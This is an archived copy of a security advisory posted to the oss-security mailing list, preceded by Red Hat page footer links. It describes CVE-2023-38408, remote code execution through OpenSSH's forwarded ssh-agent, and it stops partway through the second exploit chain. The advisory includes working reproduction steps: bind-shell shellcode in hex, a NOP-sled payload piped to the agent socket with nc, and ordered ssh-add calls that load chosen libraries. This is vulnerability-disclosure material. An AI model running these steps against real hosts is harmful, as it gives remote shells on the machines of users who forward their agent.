* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Systems Status

### About

* [Red Hat Subscription Value](https://access.redhat.com/subscription-value)
* [About Red Hat](https://www.redhat.com/about/)
* [Red Hat Jobs](http://jobs.redhat.com)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

Copyright  2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)


### Formatting Tips

Here are the common uses of Markdown.

Code blocks
```
~~~
Code surrounded in tildes is easier to read
~~~
```

Links/URLs`[Red Hat Customer Portal](https://access.redhat.com)`

[Learn more](/help/markdown)
Close



=== Content from www.openwall.com_26547ea5_20250125_102958.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux  *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper  *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists  *for password cracking*](/wordlists/)+ [passwdqc  *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt  *KDF & password hashing*](/yescrypt/)+ [yespower  *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish  *password hashing*](/crypt/)+ [phpass  *ditto in PHP*](/phpass/)+ [tcb  *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd  *port scan detector*](/scanlogd/)+ [popa3d  *tiny POP3 daemon*](/popa3d/)+ [blists  *web interface to mailing lists*](/blists/)+ [msulogin  *single user mode login*](/msulogin/)+ [php\_mt\_seed  *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](8) [[next>]](../../../2023/07/20/1) [[thread-next>]](../../../2023/07/20/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20230719163318.GA9123@localhost.localdomain>
Date: Wed, 19 Jul 2023 16:33:30 +0000
From: Qualys Security Advisory <qsa@...lys.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded
 ssh-agent

Qualys Security Advisory

CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

========================================================================
Contents
========================================================================

Summary
Background
Experiments
Results
Discussion
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://man.openbsd.org/ssh-agent.1>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://man.openbsd.org/ssh.1>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://www.qualys.com/research/security-advisories/> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>):

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://seclists.org/fulldisclosure/2010/Oct/344>):

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================
Results
========================================================================

In this section, we present the results of our experiments:

- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- _Unwind_Context type-confusion
- RCE in library constructor

========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
  <https://shell-storm.org/shellcode/files/shellcode-858.html>);

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice       1105  0.0  0.1   7968  4192 ?        Ss   09:48   0:00 ssh-agent -s
alice       1249  0.0  0.0   2888   956 ?        S    10:03   0:00  \_ [sh]
alice       1268  0.0  0.0   7204  3092 ?        R    10:14   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307
...
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fb15c9b560e in std::_Rb_tree_decrement(std::_Rb_tree_node_base*) () from /lib/x86_64-linux-gnu/libstdc++.so.6

(gdb) stepi
0x00007fb15d0e1250 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) x/10i 0x00007fb15d0e1250
=> 0x7fb15d0e1250:      add    %rcx,%rdx
   0x7fb15d0e1253:      notrack jmp *%rdx
   ...

(gdb) stepi
0x00007fb15d0e1253 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) stepi
0x00007ffc2ec82691 in ?? ()

(gdb) x/10i 0x00007ffc2ec82691
=> 0x7ffc2ec82691:      nop
   0x7ffc2ec82692:      nop
   0x7ffc2ec82693:      nop
   0x7ffc2ec82694:      nop
   0x7ffc2ec82695:      nop
   0x7ffc2ec82696:      nop
   0x7ffc2ec82697:      nop
   0x7ffc2ec82698:      nop
   0x7ffc2ec82699:      nop
   0x7ffc2ec8269a:      nop

(gdb) !grep stack /proc/1307/maps
7ffc2ec66000-7ffc2ec87000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://old-releases.ubuntu.com/ubuntu/> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
